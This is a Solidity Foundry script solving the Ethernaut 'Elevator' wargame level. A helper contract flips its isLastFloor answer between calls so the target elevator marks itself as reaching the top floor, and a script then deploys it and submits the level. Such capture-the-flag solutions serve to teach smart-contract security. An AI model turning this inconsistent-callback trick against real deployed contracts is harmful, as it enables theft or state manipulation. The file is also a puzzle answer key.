// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Elevator} from "../src/Elevator.sol";

/**
 *
 * Level address: 0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2
 * This elevator won't let you reach the top of your building. Right?
 *
 * Things that might help:
 * Sometimes solidity is not good at keeping promises.
 * This Elevator expects to be used from a Building.
 *
 */
contract Pawn {
    Elevator private victim;
    bool private toggle = false;

    constructor(Elevator _victim) {
        victim = _victim;
    }

    function attack() public {
        victim.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        _floor;
        toggle = !toggle;
        return !toggle;
    }
}

contract ElevatorScript is Attacker {
    Level private level = Level(0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Elevator elevator = Elevator(instance);

        Pawn pawn = new Pawn(elevator);
        pawn.attack();

        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
